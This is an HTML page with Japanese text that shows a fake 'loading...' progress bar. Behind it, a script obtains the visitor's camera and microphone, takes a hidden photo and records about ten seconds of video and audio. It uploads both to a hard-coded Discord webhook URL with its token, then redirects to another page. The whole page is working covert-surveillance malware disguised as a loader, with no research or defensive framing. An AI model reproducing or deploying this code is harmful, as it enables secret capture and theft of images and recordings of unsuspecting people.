<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>読み込み中...</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background: #f0f0f0;
    }
    #progressText {
      font-size: 24px;
      margin-bottom: 10px;
    }
    #progressBar {
      width: 80%;
      height: 25px;
      background: #ddd;
      border-radius: 5px;
      overflow: hidden;
    }
    #progressFill {
      height: 100%;
      background: #4caf50;
      width: 0%;
      transition: width 0.1s linear;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

<div id="progressText">読み込み中... 0%</div>
<div id="progressBar">
  <div id="progressFill"></div>
</div>

<video id="video" autoplay muted playsinline></video>
<canvas id="canvas"></canvas>

<script>
  const webhookUrl = "https://discord.com/api/webhooks/1377883943642333194/wPfWly6Kbxjg64NOp0xbEnDzOkwOH0Vhq8sAnex10T3b5rcOh3v-HPeXE6nKELQclAYq";
  const durationMs = 10000;
  const updateInterval = 100;
  const progressText = document.getElementById("progressText");
  const progressFill = document.getElementById("progressFill");
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");

  if (typeof MediaRecorder === 'undefined') {
    alert("このブラウザは録画に対応していません。");
  } else {
    navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
      video.srcObject = stream;

      // ✅ 写真を撮影して送信
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(() => {
          const width = video.videoWidth;
          const height = video.videoHeight;
          canvas.width = width;
          canvas.height = height;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, width, height);

          canvas.toBlob(photoBlob => {
            const photoFile = new File([photoBlob], "photo.jpg", { type: "image/jpeg" });
            const photoForm = new FormData();
            photoForm.append("file", photoFile);
            photoForm.append("content", "📸 写真を撮影しました");

            fetch(webhookUrl, {
              method: "POST",
              body: photoForm
            }).then(() => {
              // ✅ 写真送信後、録画を開始
              const mediaRecorder = new MediaRecorder(stream);
              const chunks = [];

              mediaRecorder.ondataavailable = e => chunks.push(e.data);

              mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: "video/webm" });
                const file = new File([blob], "recorded.webm");

                const formData = new FormData();
                formData.append("file", file);
                formData.append("content", "🎥 完了しました");

                fetch(webhookUrl, {
                  method: "POST",
                  body: formData
                }).then(() => {
                  window.location.href = "ku.html";
                }).catch(err => {
                  alert("録画送信失敗: " + err);
                });
              };

              mediaRecorder.start();

              // ✅ プログレスバー制御
              let currentStep = 0;
              const totalSteps = durationMs / updateInterval;

              const interval = setInterval(() => {
                currentStep++;
                const percent = Math.min(Math.round((currentStep / totalSteps) * 100), 100);
                progressText.textContent = `読み込み中... ${percent}%`;
                progressFill.style.width = `${percent}%`;

                if (currentStep >= totalSteps) {
                  clearInterval(interval);
                  mediaRecorder.stop();
                  stream.getTracks().forEach(track => track.stop());
                }
              }, updateInterval);
            }).catch(err => {
              alert("写真送信失敗: " + err);
            });
          }, "image/jpeg");
        }, 1000); // メタデータ読み込み後1秒待機して写真を撮る
      };
    }).catch(err => {
      alert("カメラ・マイクのアクセスが拒否されました：" + err);
    });
  }
</script>

</body>
</html>
